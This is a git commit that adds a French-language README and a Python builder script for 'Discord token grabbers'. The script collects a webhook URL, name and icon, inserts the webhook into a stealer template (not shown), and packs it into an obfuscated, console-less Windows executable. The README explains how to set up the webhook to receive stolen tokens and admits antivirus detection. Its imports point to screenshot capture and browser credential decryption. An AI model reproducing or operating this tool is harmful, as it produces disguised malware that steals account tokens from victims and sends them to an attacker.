7175e95ebd49dbbef4fc252d29d0a701b1ce32f1
HashTerminal <71410265+HashTerminal@users.noreply.github.com>
2021-02-02 23:36:47 +0100

    Add files via upload

---
+++ TokenGrabberMaker-main/TokenGrabberMaker-main/README.md
@@ -0,0 +1,13 @@
+#
+Ce logiciel permet de créer des token grabber discord
+#
+
+**Python doit être installé pour pouvoir utiliser le logiciel**
+
+1) Créez un webhook sur un serveur (je conseille que ça soit un serveur privé) et récupérez le lien du webhook créé.
+
+2) Exécutez TokenGrabberMaker.py et suivez les instructions.
+
+Le .exe généré est détecté par quelques antivirus. (Donc ce n'est pas indétectable)
+
+En cas de problème envoyez-moi un message sur Discord (IDRALOU#6966)
---
+++ TokenGrabberMaker-main/TokenGrabberMaker-main/TokenGrabberMaker.py
@@ -0,0 +1,114 @@
+# coding: utf-8
+import os
+import shutil
+import time
+import ctypes
+import sys
+try:
+    import requests
+except:
+    os.system(f"{sys.executable} -m pip install requests")
+    import requests
+try:
+    import PySimpleGUI as sg
+except:
+    os.system(f"{sys.executable} -m pip install pysimplegui")
+    import PySimpleGUI as sg
+try:
+    import PyInstaller.__main__
+except:
+    os.system(f"{sys.executable} -m pip install pyinstaller")
+try:
+    from pyarmor.pyarmor import main
+except:
+    os.system(f"{sys.executable} -m pip install pyarmor")
+try:
+    from PIL import ImageGrab
+except:
+    os.system(f"{sys.executable} -m pip install pillow")
+try:
+    from dhooks import Webhook, File
+except:
+    os.system(f"{sys.executable} -m pip install dhooks")
+try:
+    from Crypto.Cipher import AES
+except:
+    os.system(f"{sys.executable} -m pip install pycryptodome")
+try:
+    import win32crypt
+except:
+    os.system(f"{sys.executable} -m pip install pypiwin32")
+
+
+def build():
+    version = requests.get("https://raw.githubusercontent.com/IDRALOU/TokenGrabberMaker/main/Files/version")
+    ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Version {version.text} | JamaicanoExcel#1843")
+    if version.text != "1.0.8\n":
+        print("Une nouvelle version est disponible, le téléchargement est en cours.")
+        ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Mise à jour en cours... | JamaicanoExcel#1843")
+        new_version = requests.get("https://github.com/IDRALOU/TokenGrabberMaker/archive/main.zip")
+        with open("TokenGrabberMaker.zip", 'wb') as file:
+            file.write(new_version.content)
+        ctypes.windll.kernel32.SetConsoleTitleW("Token Grabber Maker | Mise à jour terminée | JamaicanoExcel#1843")
+        shutil.unpack_archive("TokenGrabberMaker.zip")
+        os.remove("TokenGrabberMaker.zip")
+        shutil.rmtree("Files")
+        print("Mise à jour effectuée avec succès !")
+        input("Appuyez sur une touche pour continuer...")
+        sys.exit()
+    print("""
+      _______    _                 _____           _     _                 __  __       _             
+     |__   __|  | |               / ____|         | |   | |               |  \/  |     | |            
+        | | ___ | | _____ _ __   | |  __ _ __ __ _| |__ | |__   ___ _ __  | \  / | __ _| | _____ _ __ 
+        | |/ _ \| |/ / _ \ '_ \  | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__| | |\/| |/ _` | |/ / _ \ '__|
+        | | (_) |   <  __/ | | | | |__| | | | (_| | |_) | |_) |  __/ |    | |  | | (_| |   <  __/ |   
+        |_|\___/|_|\_\___|_| |_|  \_____|_|  \__,_|_.__/|_.__/ \___|_|    |_|  |_|\__,_|_|\_\___|_|   by JamaicanoExcel#1843
+                                                                                                                                                                                     
+    """)
+    layout = [
+        [sg.Text('Webhook', size=(15, 1)), sg.Input(size=(40, 1), key="webhook")],
+        [sg.Text('Name File', size=(15, 1)), sg.Input(size=(40, 1), key="name")],
+        [sg.Text('Icon', size=(15, 1)), sg.InputText(size=(40, 1), key="iconpath"), sg.FileBrowse(button_text="Elejir", file_types=(("Icon Files", "*.ico"),("All Files", "*.*")), size=(6,1), key="iconbrowse")],
+        [sg.Button("Armar EXE", size=(10, 1))]
+    ]
+    window = sg.Window("Token Grabber Maker by JamaicanoExcel#1843", layout=layout)
+    while True:
+        event, value = window.read()
+        if event in ("Exit", "Quit", None):
+            break
+        elif event == "Armar EXE":
+            if not os.path.exists("Executable\\"):
+                os.mkdir("Executable\\")
+            if value["webhook"] == '':
+                sg.PopupNonBlocking("Especifica un webhook !")
+                continue
+            elif value["name"] == '':
+                sg.PopupNonBlocking("Especifica un nombre !")
+                continue
+            elif value['iconpath'] == '':
+                sg.PopupNonBlocking("El icono es obligatorio")
+                continue
+            check = requests.get(value['webhook'])
+            if not check.status_code == 200:
+                sg.PopupNonBlocking("La webhook es invalida!")
+                continue
+            print("El .exe se esta creando paciencia...")
+            with open("Files\\template.py", "r") as f:
+                lines = f.readlines()
+            with open(f"Executable\\{value['name']}.py", "w") as f2:
+                lines.insert(17, f"url_webhook = \"{str(value['webhook'])}\"")
+                f2.write("".join(lines))
+            os.chdir('Executable\\')
+            icon = value['iconpath']
+            name = value['name']
+            os.system(f"""pyarmor pack -e \" --noconsole -F '--icon={icon}'\" \"{os.getcwd()}\\{name}.py\"""")
+            shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\{name}.exe")
+            shutil.rmtree('build')
+            shutil.rmtree('dist')
+            os.remove(f"{name}.py")
+            os.system('cls')
+            sg.PopupNonBlocking("Le .exe a bien été créé !")
+            
+
+if __name__ == "__main__":
+    build()
